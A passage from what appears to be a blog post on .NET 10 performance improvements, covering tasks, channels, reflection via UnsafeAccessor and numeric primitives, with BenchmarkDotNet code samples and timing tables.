other way around, and the write barrier prevents earlier things from moving later, but not the other way around. (As it happens, though, while not required by specification, today the implementation of <code>lock</code> does use a full barrier on both enter and exit, so nothing before or after a <code>lock</code> will move into it.)</p><p>For <code>Task</code> in .NET 10, <code>Task.WhenAll</code> has a few changes to improve its performance. <a href="https://github.com/dotnet/runtime/pull/110536">dotnet/runtime#110536</a> avoids a temporary collection allocation when needing to buffer up tasks from an <code>IEnumerable<task></task></code>.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Runtime.CompilerServices; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { [Benchmark] public Task WhenAllAlloc() { AsyncTaskMethodBuilder t = default; Task whenAll = Task.WhenAll(from i in Enumerable.Range(0, 2) select t.Task); t.SetResult(); return whenAll; } }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>WhenAllAlloc</td> <td>.NET 9.0</td> <td>216.8 ns</td> <td>1.00</td> <td>496 B</td> <td>1.00</td> </tr> <tr> <td>WhenAllAlloc</td> <td>.NET 10.0</td> <td>181.9 ns</td> <td>0.84</td> <td>408 B</td> <td>0.82</td> </tr> </tbody> </table><p>And <a href="https://github.com/dotnet/runtime/pull/117715">dotnet/runtime#117715</a> from <a href="https://github.com/CuteLeon">@CuteLeon</a> avoids the overhead of the <code>Task.WhenAll</code> altogether when the input ends up just being a single task, in which case it simply returns that task instance.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Runtime.CompilerServices; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { [Benchmark] public Task WhenAllAlloc() { AsyncTaskMethodBuilder t = default; Task whenAll = Task.WhenAll([t.Task]); t.SetResult(); return whenAll; } }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>WhenAllAlloc</td> <td>.NET 9.0</td> <td>72.73 ns</td> <td>1.00</td> <td>144 B</td> <td>1.00</td> </tr> <tr> <td>WhenAllAlloc</td> <td>.NET 10.0</td> <td>33.06 ns</td> <td>0.45</td> <td>72 B</td> <td>0.50</td> </tr> </tbody> </table><p><a href="https://devblogs.microsoft.com/dotnet/an-introduction-to-system-threading-channels/"><code>System.Threading.Channels</code></a> is one of the lesser-known but quite useful areas of threading in .NET (you can watch <a href="https://www.youtube.com/watch?v=J3IQBI5HVOw">Yet Another &ldquo;Highly Technical Talk&rdquo; with Hanselman and Toub</a> from Build 2025 to learn more about it). If you find yourself needing a queue to hand off some data between a producer and a consumer, you should likely look into <code>Channel<t></t></code>. The library was introduced in .NET Core 3.0 as a small, robust, and fast producer/consumer queueing mechanism; it&rsquo;s evolved since, such as gaining a <code>ReadAllAsync</code> method for consuming the contents of a channel as an <code>IAsyncEnumerable<t></t></code> and a <code>PeekAsync</code> method for peeking at its contents without consuming. The original release supported <code>Channel.CreateUnbounded</code> and <code>Channel.CreateBounded</code> methods, and .NET 9 augmented those with a <code>Channel.CreateUnboundedPrioritized</code>. .NET 10 continues to expand on channels, both with functional improvements (such as with <a href="https://github.com/dotnet/runtime/pull/116097">dotnet/runtime#116097</a>, which adds an unbuffered channel implementation), and with performance improvements.</p><p>.NET 10 helps to to reduce overall memory consumption of an application using channels. One of the cross-cutting features channels supports is cancellation: you can cancel pretty much any interaction with a channel, which sports asynchronous methods for both producing and consuming data. When a reader or writer needs to pend, it creates (or reuses a pooled instance of) an <code>AsyncOperation</code> object that gets added to a queue; a later writer or reader that&rsquo;s then able to satisfy a pending reader or writer dequeues one and marks it as completed. These queues were implemented with arrays, which makes it challenging to remove an entry from the middle of the queue if the associated operation gets canceled. So, rather than trying, it simply left the canceled object in the queue, and then when it would eventually get dequeued, it&rsquo;s just thrown away and the dequeuer tries again. The theory was that, at steady state, you will quickly dequeue any canceled operations, and it&rsquo;d be better to not exert a lot of effort to try to remove them more quickly. As it turns out, that assumption was problematic for some scenarios, where the workload wasn&rsquo;t balanced, e.g. lots of readers would pend and timeout due to lack of writers, and each of those timed out readers would leave behind a canceled item in the queue. The next time a writer would come along, yes, all those canceled readers would get cleared out, but in the meantime, it would manifest as a notable increase in working set.</p><p><a href="https://github.com/dotnet/runtime/pull/116021">dotnet/runtime#116021</a> addresses that by switching from array-backed queues to linked-list-based queues. The waiter objects themselves double as the nodes in the linked lists, so the only additional memory overhead is a couple of fields for the previous and next nodes in the linked list. But even that modest increase is undesirable, so as part of the PR, it also tries to find compensating optimizations to balance things out. It&rsquo;s able to remove a field from <code>Channel<t></t></code>&lsquo;s custom implementation of <code>IValueTaskSource<t></t></code> by applying a similar optimization that was made to <code>ManualResetValueTaskSourceCore<t></t></code> in a previous release: it&rsquo;s incredibly rare for an awaiter to supply an <code>ExecutionContext</code> (via use of the awaiter&rsquo;s <code>OnCompleted</code> rather than <code>UnsafeOnCompleted</code> method), and even more so for that to happen when there&rsquo;s also a non-default <code>TaskScheduler</code> or <code>SynchronizationContext</code> that needs to be stored, so rather than using two fields for those concepts, they just get grouped into one (which means that in the super duper rare case where both are needed, it incurs an extra allocation). Another field is removed for storing a <code>CancellationToken</code> on the instance, which on .NET Core can be retrieved from other available state. These changes then actually result in the size of the <code>AsyncOperation</code> waiter instance decreasing rather than increasing. Win win. It&rsquo;s hard to see the impact of this change on throughput; it&rsquo;s easier to just see what the impact is on working set in the degenerate case where canceled operations are never removed. If I run this code:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" // dotnet run -c Release -f net10.0 --filter "*" using System.Threading.Channels; Channel<int> c = Channel.CreateUnbounded<int>(); for (int i = 0; ; i++) { CancellationTokenSource cts = new(); var vt = c.Reader.ReadAsync(cts.Token); cts.Cancel(); await ((Task)vt.AsTask()).ConfigureAwait(ConfigureAwaitOptions.SuppressThrowing); if (i % 100_000 == 0) { Console.WriteLine($"Working set: {Environment.WorkingSet:N0}b"); } }</int></int></code></pre><p>in .NET 9 I get output like this, with an ever increasing working set:</p><pre><code>Working set: 31,588,352b Working set: 164,884,480b Working set: 210,698,240b Working set: 293,711,872b Working set: 385,495,040b Working set: 478,158,848b Working set: 553,385,984b Working set: 608,206,848b Working set: 699,695,104b Working set: 793,034,752b Working set: 885,309,440b Working set: 986,103,808b Working set: 1,094,234,112b Working set: 1,156,239,360b Working set: 1,255,198,720b Working set: 1,347,604,480b Working set: 1,439,879,168b Working set: 1,532,284,928b</code></pre><p>and in .NET 10, I get output like this, with a nice level steady state working set:</p><pre><code>Working set: 33,030,144b Working set: 44,826,624b Working set: 45,481,984b Working set: 45,613,056b Working set: 45,875,200b Working set: 45,875,200b Working set: 46,006,272b Working set: 46,006,272b Working set: 46,006,272b Working set: 46,006,272b Working set: 46,006,272b Working set: 46,006,272b Working set: 46,006,272b Working set: 46,006,272b Working set: 46,006,272b Working set: 46,006,272b Working set: 46,006,272b Working set: 46,006,272b</code></pre> <h2>Reflection</h2><p>.NET 8 added the <code>[UnsafeAccessor]</code> attribute, which enables a developer to write an <code>extern</code> method that matches up with some non-visible member the developer wants to be able to use, and the runtime fixes up the accesses to be just as if the target member was being used directly. .NET 9 then extended it with generic support.</p><pre><code>// dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Reflection; using System.Runtime.CompilerServices; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private List<int> _list = new List<int>(16); private FieldInfo _itemsField = typeof(List<int>).GetField("_items", BindingFlags.NonPublic | BindingFlags.Instance)!; private static class Accessors<t> { [UnsafeAccessor(UnsafeAccessorKind.Field, Name = "_items")] public static extern ref T[] GetItems(List<t> list); } [Benchmark] public int[] WithReflection() =&gt; (int[])_itemsField.GetValue(_list)!; [Benchmark] public int[] WithUnsafeAccessor() =&gt; Accessors<int>.GetItems(_list); }</int></t></t></int></int></int></code></pre> <table> <thead> <tr> <th>Method</th> <th>Mean</th> </tr> </thead> <tbody> <tr> <td>WithReflection</td> <td>2.6397 ns</td> </tr> <tr> <td>WithUnsafeAccessor</td> <td>0.7300 ns</td> </tr> </tbody> </table><p>But there are still gaps in that story. The signature of the <code>UnsafeAccessor</code> member needs to align with the signature of the target member, but what if that target member has parameters that aren&rsquo;t visible to the code writing the <code>UnsafeAccessor</code>? Or, what if the target member is static? There&rsquo;s no way for the developer to express in the <code>UnsafeAccessor</code> on which type the target member exists.</p><p>For these scenarios, <a href="https://github.com/dotnet/runtime/pull/114881">dotnet/runtime#114881</a> augments the story with the <code>[UnsafeAccessorType]</code> attribute. The <code>UnsafeAccessor</code> method can type the relevant parameters as <code>object</code> but then adorn them with an <code>[UnsafeAccessorType("...")]</code> that provides a fully-qualified name of the target type. There are a bunch of examples then of this being used in <a href="https://github.com/dotnet/runtime/pull/115583">dotnet/runtime#115583</a>, which replaces most of the cross-library reflection done between libraries in .NET itself with use of <code>[UnsafeAccessor]</code>. An example of where this is handy is with a cyclic relationship between <code>System.Net.Http</code> and <code>System.Security.Cryptography</code>. <code>System.Net.Http</code> sits above <code>System.Security.Cryptography</code>, referencing it for critical features like <code>X509Certificate</code>. But <code>System.Security.Cryptography</code> needs to be able to make HTTP requests in order to download OCSP information, and with <code>System.Net.Http</code> referencing <code>System.Security.Cryptography</code>, <code>System.Security.Cryptography</code> can&rsquo;t in turn explicitly reference <code>System.Net.Http</code>. It can, however, use reflection or <code>[UnsafeAccessor]</code> and <code>[UnsafeAccessorType]</code> to do so, and it does. It used to use reflection, now in .NET 10 it uses <code>[UnsafeAccessor]</code>.</p><p>There are a few other nice improvements in and around reflection. <a href="https://github.com/dotnet/runtime/pull/105814">dotnet/runtime#105814</a> from <a href="https://github.com/huoyaoyuan">@huoyaoyuan</a> updates <code>ActivatorUtilities.CreateFactory</code> to remove a layer of delegates. <code>CreateFactory</code> returns an <code>ObjectFactory</code> delegate, but under the covers the implementation was creating a <code>Func&lt;...&gt;</code> and then creating an <code>ObjectFactory</code> delegate for that <code>Func&lt;...&gt;</code>&lsquo;s <code>Invoke</code> method. The PR changes it to just create the <code>ObjectFactory</code> initially, which means every invocation avoids one layer of delegate invocation.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Configs; using BenchmarkDotNet.Environments; using BenchmarkDotNet.Jobs; using BenchmarkDotNet.Running; using Microsoft.Extensions.DependencyInjection; var config = DefaultConfig.Instance .AddJob(Job.Default.WithRuntime(CoreRuntime.Core90).WithNuGet("Microsoft.Extensions.DependencyInjection.Abstractions", "9.0.9").AsBaseline()) .AddJob(Job.Default.WithRuntime(CoreRuntime.Core10_0).WithNuGet("Microsoft.Extensions.DependencyInjection.Abstractions", "10.0.0-rc.1.25451.107")); BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args, config); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "NuGetReferences")] public partial class Tests { private IServiceProvider _sp = new ServiceCollection().BuildServiceProvider(); private ObjectFactory _factory = ActivatorUtilities.CreateFactory(typeof(object), Type.EmptyTypes); [Benchmark] public object CreateInstance() =&gt; _factory(_sp, null); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>CreateInstance</td> <td>.NET 9.0</td> <td>8.136 ns</td> <td>1.00</td> </tr> <tr> <td>CreateInstance</td> <td>.NET 10.0</td> <td>6.676 ns</td> <td>0.82</td> </tr> </tbody> </table><p><a href="https://github.com/dotnet/runtime/pull/112350">dotnet/runtime#112350</a> reduces some overheads and allocations as part of parsing and rendering <code>TypeName</code>s.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Reflection.Metadata; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "t")] public partial class Tests { [Benchmark] [Arguments(typeof(Dictionary<list>[,], List<int>&gt;[]))] public string ParseAndGetName(Type t) =&gt; TypeName.Parse(t.FullName).FullName; }</int></list></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>ParseAndGetName</td> <td>.NET 9.0</td> <td>5.930 us</td> <td>1.00</td> <td>12.25 KB</td> <td>1.00</td> </tr> <tr> <td>ParseAndGetName</td> <td>.NET 10.0</td> <td>4.305 us</td> <td>0.73</td> <td>5.75 KB</td> <td>0.47</td> </tr> </tbody> </table><p>And <a href="https://github.com/dotnet/runtime/pull/113803">dotnet/runtime#113803</a> from <a href="https://github.com/teo-tsirpanis">@teo-tsirpanis</a> improves how <code>DebugDirectoryBuilder</code> in <code>System.Reflection.Metadata</code> uses <code>DeflateStream</code> to embed a PDB. The code was previously buffering the compressed output into an intermediate <code>MemoryStream</code>, and then that <code>MemoryStream</code> was being written to the <code>BlobBuilder</code>. With this change, the <code>DeflateStream</code> is wrapped directly around the <code>BlobBuilder</code>, enabling the compressed data to be propagated directly to <code>builder.WriteBytes</code>.</p><h2>Primitives and Numerics</h2><p>Every time I write one of these &ldquo;Performance Improvements in .NET&rdquo; posts, a part of me thinks &ldquo;how could there possibly be more next time.&rdquo; That&rsquo;s especially true for core data types, which have received so much scrutiny over the years. Yet, here we are, with more to look at for .NET 10.</p><p><code>DateTime</code> and <code>DateTimeOffset</code> get some love in <a href="https://github.com/dotnet/runtime/pull/111112">dotnet/runtime#111112</a>, in particular with micro-optimizations around how instances are initialized. Similar tweaks show up in <a href="https://github.com/dotnet/runtime/pull/111244">dotnet/runtime#111244</a> for <code>DateOnly</code>, <code>TimeOnly</code>, and <code>ISOWeek</code>.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private DateTimeOffset _dto = new DateTimeOffset(2025, 9, 10, 0, 0, 0, TimeSpan.Zero); [Benchmark] public DateTimeOffset GetFutureTime() =&gt; _dto + TimeSpan.FromDays(1); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>GetFutureTime</td> <td>.NET 9.0</td> <td>6.012 ns</td> <td>1.00</td> </tr> <tr> <td>GetFutureTime</td> <td>.NET 10.0</td> <td>1.029 ns</td> <td>0.17</td> </tr> </tbody> </table><p><code>Guid</code> gets several notable performance improvements in .NET 10. <a href="https://github.com/dotnet/runtime/pull/105654">dotnet/runtime#105654</a> from <a href="https://github.com/SirCxyrtyx">@SirCxyrtyx</a> imbues <code>Guid</code> with an implementation of <code>IUtf8SpanParsable</code>. This not only allows <code>Guid</code> to be used in places where a generic parameter is constrained to <code>IUtf8SpanParsable</code>, it gives <code>Guid</code> overloads of <code>Parse</code> and <code>TryParse</code> that operate on UTF8 bytes. This means if you have UTF8 data, you don&rsquo;t first need to transcode it to UTF16 in order to parse it, nor use <code>Utf8Parser.TryParse</code>, which isn&rsquo;t as optimized as is <code>Guid.TryParse</code> (but which does enable parsing out a <code>Guid</code> from the beginning of a larger input).</p><pre><code>// dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Buffers.Text; using System.Text; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private byte[] _utf8 = Encoding.UTF8.GetBytes(Guid.NewGuid().ToString("N")); [Benchmark(Baseline = true)] public Guid TranscodeParse() { Span<char> scratch = stackalloc char[64]; ReadOnlySpan<char> input = Encoding.UTF8.TryGetChars(_utf8, scratch, out int charsWritten) ? scratch.Slice(0, charsWritten) : Encoding.UTF8.GetString(_utf8); return Guid.Parse(input); } [Benchmark] public Guid Utf8ParserParse() =&gt; Utf8Parser.TryParse(_utf8, out Guid result, out _, 'N') ? result : Guid.Empty; [Benchmark] public Guid GuidParse() =&gt; Guid.Parse(_utf8); }</char></char></code></pre> <table> <thead> <tr> <th>Method</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>TranscodeParse</td> <td>24.72 ns</td> <td>1.00</td> </tr> <tr> <td>Utf8ParserParse</td> <td>19.34 ns</td> <td>0.78</td> </tr> <tr> <td>GuidParse</td> <td>16.47 ns</td> <td>0.67</td> </tr> </tbody> </table><p><code>Char</code>, <code>Rune</code>, and <code>Version</code> also gained <code>IUtf8SpanParsable</code> implementations, in <a href="https://github.com/dotnet/runtime/pull/105773">dotnet/runtime#105773</a> from <a href="https://github.com/lilinus">@lilinus</a> and <a href="https://github.com/dotnet/runtime/pull/109252">dotnet/runtime#109252</a> from <a href="https://github.com/lilinus">@lilinus</a>. There&rsquo;s not much of a performance benefit here for <code>char</code> and <code>Rune</code>; implementing the interface mainly yields consistency and the ability to use these types with generic routines parameterized based on that interface. But <code>Version</code> gains the same kinds of performance (and usability) benefits as did <code>Guid</code>: it now sports support for parsing directly from UTF8, rather than needing to transcode first to UTF16 and then parse that.</p><pre><code>// dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Text; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private byte[] _utf8 = Encoding.UTF8.GetBytes(new Version("123.456.789.10").ToString()); [Benchmark(Baseline = true)] public Version TranscodeParse() { Span<char> scratch = stackalloc char[64]; ReadOnlySpan<char> input = Encoding.UTF8.TryGetChars(_utf8, scratch, out int charsWritten) ? scratch.Slice(0, charsWritten) : Encoding.UTF8.GetString(_utf8); return Version.Parse(input); } [Benchmark] public Version GuidParse() =&gt; Version.Parse(_utf8); }</char></char></code></pre> <table> <thead> <tr> <th>Method</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>TranscodeParse</td> <td>46.48 ns</td> <td>1.00</td> </tr> <tr> <td>GuidParse</td> <td>35.75 ns</td> <td>0.77</td> </tr> </tbody> </table><p>Sometimes performance improvements come about as a side-effect of other work. <a href="https://github.com/dotnet/runtime/pull/110923">dotnet/runtime#110923</a> was intending to remove some pointer use from <code>Guid</code>&lsquo;s formatting implementation, but in doing so, it ended up also slightly improving throughput of the (admittedly rarely used) &ldquo;X&rdquo; format.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private char[] _dest = new char[64]; private Guid _g = Guid.NewGuid(); [Benchmark] public void FormatX() =&gt; _g.TryFormat(_dest, out int charsWritten, "X"); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>FormatX</td> <td>.NET 9.0</td> <td>3.0584 ns</td> <td>1.00</td> </tr> <tr> <td>FormatX</td> <td>.NET 10.0</td> <td>0.7873 ns</td> <td>0.26</td> </tr> </tbody> </table><p><code>Random</code> (and its cryptographically-secure counterpart <code>RandomNumberGenerator</code>) continues to improve in .NET 10, with new methods (such as <code>Random.GetString</code> and <code>Random.GetHexString</code> from <a href="https://github.com/dotnet/runtime/pull/112162">dotnet/runtime#112162</a>) for usability, but also importantly with performance improvements to existing methods. Both <code>Random</code> and <code>RandomNumberGenerator</code> were given a handy <code>GetItems</code> method in .NET 8; this method allows a caller to supply a set of choices and the number of items desired, allowing <code>Random{NumberGenerator}</code> to perform &ldquo;sampling with replacement&rdquo;, selecting an item from the set that number of times. In .NET 9, these implementations were optimized to special-case a power-of-2 number of choices that&rsquo;s less than or equal to 256. In such a case, we can avoid many trips to the underlying source of randomness by requesting bytes in bulk, rather than requesting an <code>int</code> per element. With the power-of-2 choice count, we can simply mask each byte to produce the index into the choices while not introducing bias. In .NET 10, <a href="https://github.com/dotnet/runtime/pull/107988">dotnet/runtime#107988</a> extends this to apply to non-power-of-2 cases, as well. We can&rsquo;t just mask off bits as in the power-of-2 case, but we can do &ldquo;rejection sampling,&rdquo; which is just a fancy way of saying &ldquo;if you randomly get a value outside of the allowed range, try again&rdquo;.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Security.Cryptography; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private const string Base58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"; [Params(30)] public int Length { get; set; } [Benchmark] public char[] WithRandom() =&gt; Random.Shared.GetItems<char>(Base58, Length); [Benchmark] public char[] WithRandomNumberGenerator() =&gt; RandomNumberGenerator.GetItems<char>(Base58, Length); }</char></char></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Length</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>WithRandom</td> <td>.NET 9.0</td> <td>30</td> <td>144.42 ns</td> <td>1.00</td> </tr> <tr> <td>WithRandom</td> <td>.NET 10.0</td> <td>30</td> <td>73.68 ns</td> <td>0.51</td> </tr> <tr> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td>WithRandomNumberGenerator</td> <td>.NET 9.0</td> <td>30</td> <td>23,179.73 ns</td> <td>1.00</td> </tr> <tr> <td>WithRandomNumberGenerator</td> <td>.NET 10.0</td> <td>30</td> <td>853.47 ns</td> <td>0.04</td> </tr> </tbody> </table><p><code>decimal</code> operations, specifically multiplication and division, get a performance bump, thanks to <a href="https://github.com/dotnet/runtime/pull/99212">dotnet/runtime#99212</a> from <a href="https://github.com/Daniel-Svensson">@Daniel-Svensson</a>.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private decimal _n = 9.87654321m; private decimal _d = 1.23456789m; [Benchmark] public decimal Divide() =&gt; _n / _d; }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Divide</td> <td>.NET 9.0</td> <td>27.09 ns</td> <td>1.00</td> </tr> <tr> <td>Divide</td> <td>.NET 10.0</td> <td>23.68 ns</td> <td>0.87</td> </tr> </tbody> </table><p><code>UInt128</code> division similarly gets some assistance in <a href="https://github.com/dotnet/runtime/pull/99747">dotnet/runtime#99747</a> from <a href="https://github.com/Daniel-Svensson">@Daniel-Svensson</a>, utilizing the X86 <code>DivRem</code> hardware intrinsic when dividing a value that&rsquo;s larger than a <code>ulong</code> by a value that could fit in a <code>ulong</code>.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private UInt128 _n = new UInt128(123, 456); private UInt128 _d = new UInt128(0, 789); [Benchmark] public UInt128 Divide() =&gt; _n / _d; }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Divide</td> <td>.NET 9.0</td> <td>27.3112 ns</td> <td>1.00</td> </tr> <tr> <td>Divide</td> <td>.NET 10.0</td> <td>0.5522 ns</td> <td>0.02</td> </tr> </tbody> </table><p><code>BigInteger</code> gets a few improvements as well. <a href="https://github.com/dotnet/runtime/pull/115445">dotnet/runtime#115445</a> from <a href="https://github.com/Rob-Hague">@Rob-Hague</a> augments its <code>TryWriteBytes</code> method to use a direct memory copy when viable, namely when the number is non-negative such that it doesn&rsquo;t need twos-complement tweaks.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Numerics; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private BigInteger _value = BigInteger.Parse(string.Concat(Enumerable.Repeat("1234567890", 20))); private byte[] _bytes = new byte[256]; [Benchmark] public bool TryWriteBytes() =&gt; _value.TryWriteBytes(_bytes, out _); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>TryWriteBytes</td> <td>.NET 9.0</td> <td>27.814 ns</td> <td>1.00</td> </tr> <tr> <td>TryWriteBytes</td> <td>.NET 10.0</td> <td>5.743 ns</td> <td>0.21</td> </tr> </tbody> </table><p>Also rare but fun, if you tried using <code>BigInteger.Parse</code> exactly with the string representation of <code>int.MinValue</code>, you&rsquo;d end up allocating unnecessarily. That&rsquo;s addressed by <a href="https://github.com/dotnet/runtime/pull/104666">dotnet/runtime#104666</a> from <a href="https://github.com/kzrnm">@kzrnm</a>, which tweaks the handling of this corner-case so that it&rsquo;s appropriately recognized as a case that can be represented using a singleton for <code>int.MinValue</code> (the singleton already existed, it just wasn&rsquo;t applied in this case).</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Numerics; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private string _int32min = int.MinValue.ToString(); [Benchmark] public BigInteger ParseInt32Min() =&gt; BigInteger.Parse(_int32min); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>ParseInt32Min</td> <td>.NET 9.0</td> <td>80.54 ns</td> <td>1.00</td> <td>32 B</td> <td>1.00</td> </tr> <tr> <td>ParseInt32Min</td> <td>.NET 10.0</td> <td>71.59 ns</td> <td>0.89</td> <td>&ndash;</td> <td>0.00</td> </tr> </tbody> </table><p>One area that got a lot of attention in .NET 10 is <code>System.Numerics.Tensors</code>. The <code>System.Numerics.Tensors</code> library was introduced in .NET 8, focusing on a <code>TensorPrimitives</code> class that provided various numerical routines on spans of <code>float</code>. .NET 9 then expanded <code>TensorPrimitives</code> with more operations and generic versions of them. Now in .NET 10, <code>TensorPrimitives</code> gains even more operations, with many of the existing ones also made faster for various scenarios.</p><p>To start, <a href="https://github.com/dotnet/runtime/pull/112933">dotnet/runtime#112933</a> adds over 70 new overloads to <code>TensorPrimitives</code>, including operations like <code>StdDev</code>, <code>Average</code>, <code>Clamp</code>, <code>DivRem</code>, <code>IsNaN</code>, <code>IsPow2</code>, <code>Remainder</code>, and many more. The majority of these operations are also vectorized, using shared implementations that are parameterized with generic operators. For example, the entirety of the <code>Decrement<t></t></code> implementation is:</p><pre><code>public static void Decrement<t>(ReadOnlySpan<t> x, Span<t> destination) where T : IDecrementOperators<t> =&gt; InvokeSpanIntoSpan<t>&gt;(x, destination);</t></t></t></t></t></code></pre><p>where <code>InvokeSpanIntoSpan</code> is a shared routine used by almost 60 methods, each of which supplies its own operator that&rsquo;s then used in the heavily-optimized routine. In this case, the <code>DecrementOperator<t></t></code> is simply this:</p><pre><code>private readonly struct DecrementOperator<t> : IUnaryOperator<t> where T : IDecrementOperators<t> { public static bool Vectorizable =&gt; true; public static T Invoke(T x) =&gt; --x; public static Vector128<t> Invoke(Vector128<t> x) =&gt; x - Vector128<t>.One; public static Vector256<t> Invoke(Vector256<t> x) =&gt; x - Vector256<t>.One; public static Vector512<t> Invoke(Vector512<t> x) =&gt; x - Vector512<t>.One; }</t></t></t></t></t></t></t></t></t></t></t></t></code></pre><p>With that minimal implementation, which provides a decrement implementation for vectorized widths of 128 bits, 256 bits, 512 bits, and scalar, the workhorse routine is able to provide a very efficient implementation.</p><pre><code>// Update benchmark.csproj with a package reference to System.Numerics.Tensors. // dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Numerics.Tensors; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private float[] _src = Enumerable.Range(0, 